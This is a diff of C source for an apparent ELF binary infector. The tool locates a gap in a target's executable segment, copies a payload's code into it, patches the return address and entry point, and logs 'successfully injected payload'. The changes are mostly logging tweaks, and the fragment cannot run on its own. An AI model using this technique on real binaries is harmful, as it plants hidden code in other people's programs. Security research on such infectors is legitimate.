@@ -51,15 +51,16 @@ int main(int argc, char *argv[])
     target_hdr = (Elf64_Ehdr *) target_data;
     target_ep = target_hdr->e_entry;
 
-    log_infof("target entry point: %p", (void *) target_ep);
+    log_debugf("target entry point: %p", (void *) target_ep);
 
     /* elfi_dump_segments(target_hdr); */
 
     /* find executable segment and obtain offset and gap size */
-    target_text_seg = elfi_find_gap(target_data, target_fsize, &gap_offset, &gap_len);
+    target_text_seg = elfi_find_gap(target_data, target_fsize,
+                                    &gap_offset, &gap_len);
     target_base = target_text_seg->p_vaddr;
 
-    log_infof("target base address: %p", (void *) target_base);
+    log_debugf("target base address: %p", (void *) target_base);
 
     payload_text_sec = elfi_find_section(payload_data, ".text");
 
@@ -67,12 +68,13 @@ int main(int argc, char *argv[])
     target_text_seg->p_filesz += payload_text_sec->sh_size;
     target_text_seg->p_memsz += payload_text_sec->sh_size;
 
-    log_infof("payload .text section found at %lx (%lx bytes)",
+    log_debugf("payload .text section: %lx (%lx bytes)",
               payload_text_sec->sh_offset, payload_text_sec->sh_size);
 
     /* check size of payload vs gap */
     if (payload_text_sec->sh_size > (unsigned long) gap_len) {
-        log_errf("payload to big, cannot infect file");
+        log_errf("payload to big, cannot infect file (%lu > %d)",
+                 payload_text_sec->sh_size, gap_len);
         exit(1);
     }
 
@@ -86,7 +88,8 @@ int main(int argc, char *argv[])
                          payload_text_sec->sh_size,
                          RET_PATTERN, (long) target_ep);
     if (ret) {
-        log_err("failed to patch return address");
+        log_errf("failed to patch return address (%p)",
+                 (void *) (target_data + gap_offset));
 
         close(target_fd);
         close(payload_fd);
@@ -97,7 +100,10 @@ int main(int argc, char *argv[])
     /* patch entry point */
     target_hdr->e_entry = (Elf64_Addr) (target_base + gap_offset);
 
-    log_infof("new target entry: %p", (void *) target_hdr->e_entry);
+    log_debugf("new target entry: %p", (void *) target_hdr->e_entry);
+
+    log_infof("successfully injected payload at %p",
+              (void *) (target_data + gap_offset));
 
     /* clean up */
     close(target_fd);
